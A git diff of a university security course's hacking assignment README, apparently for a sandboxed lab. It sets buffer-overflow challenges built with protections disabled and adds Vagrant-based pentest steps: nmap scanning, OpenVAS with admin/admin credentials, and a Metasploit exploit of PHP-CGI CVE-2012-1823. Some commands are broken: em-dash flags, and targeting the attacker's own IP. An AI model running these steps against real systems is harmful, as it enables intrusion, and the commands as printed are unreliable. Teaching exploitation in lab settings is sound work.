@@ -1,6 +1,6 @@
 # CSCD27 Assignment 3
 
-So, You Want to be a Hacker? This is your chance. In this assignment you will have the chance to write your own exploits, penetrate a server and hack a web application:
+So, You Want to be a hacker? This is your chance. In this assignment you will have the chance to write your own exploits, penetrate a server and hack a web application:
 
 - Part 1. Vulnerability exploitation (Lab 9)
 - Part 2. Penetration Testing (Lab 6 & 10)
@@ -69,7 +69,7 @@ Challenge #2 reads from stdin and prints a message. Your attack will provide an 
 
 ### Challenge 3 [15 points]: Indirect control-transfer to shellcode
 
-This challenge code uses "safe" string-copy function strncpy(), so you won't be able to use the same approach as for challenge #1 and #2. Instead, you'll have to find a more devious way to get the shellcode to execute. As with challenge #2, your goal is to obtain a root shell, using the provided shellcode.
+This challenge code uses "safe" string-copy function strncpy(), so you won't be able to use the same approach as for challenge #1 and #2. Instead, you'll have to find a more devious way to create a backdoor.
 
 - Compile: `gcc challenge3.c -o challenge3 -fno-stack-protector -m32 -z execstack`
 - Attack: `./challenge3 $(python attack3.py)`
@@ -77,14 +77,14 @@ This challenge code uses "safe" string-copy function strncpy(), so you won't be 
 
 ### Challenge 4 [15 points]: File-based shellcode
 
-The command-line argument to challenge #4 names a file to be read. The file contains a 32-bit unsigned integer value N, followed by N 32-bit integer values. Your goal is to create a data file in this format that leads to a root shell, using the provided shellcode.
+The command-line argument to challenge #4 names a file to be read. This file is a list of short words (less than 12 characters). Your attack will create a file that causes the program to create a backdoor.
 
 - Compile: `gcc challenge4.c -o challenge4 -fno-stack-protector -m32 -z execstack`
 - Attack: `./challenge4 <(python attack4.py)`
 
 ### Challenge 5 [20 bonus points]: Shellcode in a no-execute stack environment
 
-An important defense against buffer overflows is use of a hardware/OS feature that flags the stack address space as non-executable. The processor will not execute any instructions that are stored on the stack. You can still use buffer-overflow tactics, such as overflowing variable storage space and modifying a return address, but you'll have to find a new mechanism for obtaining a root shell.
+An important defense against buffer overflows is use of a hardware/OS feature that flags the stack address space as non-executable. The processor will not execute any instructions that are stored on the stack. You can still use buffer-overflow tactics, such as overflowing variable storage space and modifying a return address, but you'll have to find a new mechanism for creating a backdoor.
 
 - Compile: `gcc challenge5.c -o challenge5 -m32`
 - Attack: `./challenge5 $(python attack5.py)`
@@ -103,7 +103,7 @@ In all the previous challenges, stack addresses were consistent across execution
 
 Challenge #7 reads an input from the command line and asks the user for a password. If the password is correct, the program will execute the command given at the command line. Rather than trying to crack the password (it is a strong password), use your hacking skills to bypass the authentication and execute any arbitrary command.
 
-- Compile: `gcc challenge7.c -o challenge7 -m32 -fno-stack-protector -z execstack -lcrypt`
+- Compile: `gcc challenge7.c -o challenge7 -m32 -fno-stack-protector -lcrypt`
 - Attack: `python attack7.py | ./challenge7 bash`
 
 ### Challenge 8 [30 bonus points]: Remote code execution via a reverse shell
@@ -118,19 +118,83 @@ ___
 
 ## Part 2. Penetration Testing
 
-These challenges requires a vulnerable vagrant box:
+Unfortunately, this vagrant setup for this part does not work on the linux lab. To do this exercise, you will need to install Virtualbox and Vagrant on your personal laptop.
+
 ```shell
 cd ~/cscd27f16_space/CSCD27-F16/assignments/03/code/part2
 $ vagrant up
 ```
 
-You should **not** ssh into the vagrant.
 
-### Challenge 9 [10 bonus points]:
+The vagrant setup is composed of two boxes:
 
-### Challenge 10 [20 bonus points]:
+- **kali** is the attacker's machine (ip 10.0.1.101)
+- **target** is the victim's machine (ip 10.0.1.102)
 
-### Challenge 11 [20 bonus points]:
+In the challenges below, you should use exclusively the kali VM without ssh'ing into the target VM.
+
+## Challenge 9 [10 bonus points]: Nmap - Network Mapping and Host Fingerprinting
+
+In this challenge, we are going to use nmap to discover the services running on the target machine. This command exports the results in a file called `target.nmap`:
+
+```shell
+$ nmap -O —sV -p0-65535 10.0.1.101 -oN target.nmap
+```
+
+## Challenge 10 [20 bonus points]: OpenVAS - Vulnerability Scanner
+
+In this challenge, we are going to use OpenVAS vulnerability scanner to audit the security of the target:
+
+```shell
+$ openvas-setup
+$ openvas-start
+Starting OpenVas Services
+Starting Greenbone Security Assistant: gsad.
+Starting OpenVAS Scanner: openvassd.
+Starting OpenVAS Manager: openvasmd.
+```
+
+**Important:** Make sure that the 4 OpenVAS components have all started correctly without any `ERROR`. If any, stop OpenVAS (`openvas-stop`) and restart it.
+
+Once OpenVAS has correctly started, add the admin user:
+
+```shell
+$ openvasmd —create-user=admin
+$ openvasmd —new-password=admin —user=admin
+```
+
+Finally, scan the target and export (as a pdf) the report through the OpenVAS web interface (https://localhost:9392)[https://localhost:9392]
+
+## Challenge 11 [20 bonus points]: Metasploit - Exploit Framework
+
+In this challenge, we are going to use Metasploit to exploit a vulnerability ([CVE-2012-1823](http://www.cvedetails.com/cve/CVE-2012-1823/)) in the CGI module of PHP (versions before 5.3.12 and before 5.4.2). First, let us update and start the metasploit console:
+
+```shell
+$ msfupdate
+$ service postgresql start
+$ msfconsole
+```
+
+Thus, we can load, configure and run the exploit:
+
+1. load the `­use exploit/multi/http/php_cgi_arg_injection` exploit
+
+    ```shell
+    msf > use exploit/multi/http/php_cgi_arg_injection
+    ```
+
+2. show and assign values to the exploit arguments:
+
+    ```shell
+    msf > show options
+    msf > set TARGET 10.0.1.101
+    ```
+
+3. run the exploit
+
+    ```
+    msf > exploit
+    ```
 
 ___
 
